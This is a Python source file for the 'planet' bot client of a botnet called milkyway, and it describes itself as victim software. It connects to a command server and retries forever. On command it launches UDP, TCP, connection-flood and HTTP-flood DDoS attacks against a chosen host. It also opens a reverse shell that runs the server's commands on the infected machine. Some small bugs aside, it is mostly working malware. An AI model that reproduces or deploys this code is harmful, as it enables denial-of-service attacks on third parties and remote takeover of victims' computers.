#!/usr/bin/env python3

"""planet: The milkyway client/victim software."""

# import libraries
import multiprocessing
import os
import random
import socket
import subprocess
import sys
import time
from threading import Thread
from signal import SIGINT, signal


# functions
class Utilities:
    """Provide some useful variables and utilities."""

    online = False
    shutting_down = False
    platform = ""
    ip = "127.0.0.1"
    port = 9999
    id = ""

    def __init__(self):
        """Perform some important tasks on initialization.

        Tasks:
        - Check to see if the OS that the planet is running is macOS, Linux, or Windows.
        - Start a SIGINT exit handler to safely close the planet.
        - Open a socket, and connect to a specified galaxy.
        - Launch a thread to handle connections.
        """
        self.check_platform()
        signal(SIGINT, self.exit_handler)
        self.connect_to_galaxy()
        Thread(target=self.connection_handler).start()

    def connect_to_galaxy(self):
        """Open a socket, and connect to a specified galaxy."""
        while not self.online:
            try:
                print("Connecting to the galaxy's main port...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.ip, self.port))
                print("Successfully connected to the galaxy's main port.")
                self.online = True
            except ConnectionRefusedError:
                self.socket.close()
                print("Cannot connect to the galaxy's main port. Retrying in 5 seconds...")
                time.sleep(5)

    def check_platform(self):
        """Ensure the platform that the galaxy is running on is either Linux, macOS, or Windows."""
        if sys.platform in ("linux", "linux2"):
            self.platform = "linux"
        elif sys.platform == "darwin":
            self.platform = "mac"
        elif sys.platform == "win32":
            self.platform = "windows"
        else:
            sys.exit("Unsupported platform.")

    def exit_handler(self, *args):
        """Ensure a smooth and safe exit."""
        self.shutting_down = True
        if self.online:
            self.socket.send("offline".encode())
        self.online = False
        ddos_handler.attacking = False
        self.socket.close()
        print("Exiting...")
        os._exit(0)

    def connection_handler(self):
        """Handle commands coming from galaxy, and keep planet connected to galaxy."""
        while not self.shutting_down:
            while self.online:
                try:
                    data = self.socket.recv(1024).decode("ascii").lower()
                    if "ddos" in data:
                        ddos_handler.ddos_cmd_handler(data)
                    elif "planet ID: " in data:
                        self.id = data.replace("planet ID: ", "").strip()
                        print(f"Recieved planet ID: {self.id}")
                    elif data == "shell start":
                        shell_handler.shell()
                    elif not data:
                        print("Having trouble connecting to galaxy, attempting to reconnect...")
                        self.online = False
                        self.connect_to_galaxy()
                except IOError as e:
                    print("Having trouble connecting to galaxy, attempting to reconnect...")
                    print(f"Error: {e}")
                    self.online = False
                    self.connect_to_galaxy()
                time.sleep(1)
            ddos_handler.attacking = False


class DDoSHandler:
    """Provide functions and variables to attempt a DDoS attack on a remote host."""

    attacking = False
    ip = ""
    port = 0
    type = ""

    def __init__(self):
        """Set the attack_thread_count variable to the number of CPU threads - 1."""
        self.attack_thread_count = multiprocessing.cpu_count() - 1

    def ddos_cmd_handler(self, cmd):
        """Launch an attack of a specific type with the predefined number of threads."""
        if "stop" in cmd:
            print("Recieved stop DDoS command.")
            if self.attacking:
                self.attacking = False
                print("Attack stopped.")
            else:
                print("No attack to stop!")
            return
        else:
            print("Recieved DDoS command.")
            _, self.ip, self.port, self.type = cmd.strip().split()
        self.port = int(self.port)
        self.attacking = True
        if self.type == "udp":
            for _ in range(self.attack_thread_count):
                self.ddos_udp()
        elif self.type == "tcp":
            for _ in range(self.attack_thread_count):
                self.ddos_tcp()
        elif self.type == "syn":
            for _ in range(self.attack_thread_count):
                self.ddos_syn()
        else:
            for _ in range(self.attack_thread_count):
                self.ddos_http()
        print("Attacking!")

    def ddos_udp(self):
        """Attempt a DDoS attack on a remote host by spamming large packets of data (UDP ONLY)."""
        while self.attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((self.ip, self.port))
                s.sendto(os.urandom(10240), (self.ip, self.port))
                s.close()
            except IOError:
                time.sleep(1)
        try:
            s.close()
        except IOError:
            pass

    def ddos_tcp(self):
        """Attempt a DDoS attack on a remote host by spamming large packets of data (TCP ONLY)."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while self.attacking:
            try:
                s.setblocking(0)
                s.sendto(os.urandom(10240), (self.ip, self.port))
            except IOError:
                time.sleep(1)
        try:
            s.close()
        except IOError:
            pass

    def ddos_syn(self):
        """Attempt a DDoS attack on a remote host by spamming connections and disconnections."""
        while self.attacking:
            try:
                s = socket.socket()
                s.connect((self.ip, self.port))
                s.close()
            except IOError:
                time.sleep(1)
        try:
            s.close()
        except IOError:
            pass

    def ddos_http(self):
        """Attempt a DDoS attack on a remote host by spamming HTTP GET requests."""
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        while self.attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(self.ip), int(self.port)))
                s.sendto(f"GET /{self.ip} HTTP/1.1\r\n".encode("ascii"), (self.ip, self.port))
                s.sendto(f"Host: {src_ip} \r\n\r\n".encode("ascii"), (self.ip, self.port))
                s.close()
            except IOError:
                time.sleep(1)
        try:
            s.close()
        except IOError:
            pass


class ShellHandler:
    """Provide functions and variables to establish a remote shell with a galaxy."""

    port = 10000
    shelling = True

    def process_commands(self, cmd):
        """Process incoming shell commands."""
        shell_cmds = cmd.split("&&")
        output = ""
        new_cmd_list = []
        for possible_cmd in shell_cmds:
            temp_cmd = possible_cmd.split(";")
            for item in temp_cmd:
                new_cmd_list.append(item.strip())
        for loop_cmd in new_cmd_list:
            if loop_cmd == "exit":
                self.shelling = False
                return "exit"
            if loop_cmd[:3].lower() == "cd ":
                new_cmd = loop_cmd.replace("cd ", "", 1)
                try:
                    os.chdir(new_cmd)
                except FileNotFoundError:
                    output.append(f"Directory {new_cmd} not found.")
            else:
                output = f"{output}\n{subprocess.getoutput(cmd)}"
        return output

    def shell(self):
        """Establish connection to galaxy, and send incoming commands off to processor."""
        self.shelling = True
        shell_socket = socket.socket()
        shell_socket.connect((utilities.ip, self.port))
        cwd = os.getcwd()
        shell_socket.send(cwd.encode())
        while not utilities.shutting_down and self.shelling:
            shell_cmd = shell_socket.recv(128 * 1024).decode()
            output = self.process_commands(shell_cmd)
            cwd = os.getcwd()
            output = f"{output}<sep>{cwd}"
            shell_socket.send(output.encode())
        if utilities.shutting_down:
            shell_socket.send("shutting down".encode())
        shell_socket.close()
        self.shelling = False


# initialize classes
ddos_handler = DDoSHandler()
shell_handler = ShellHandler()
utilities = Utilities()
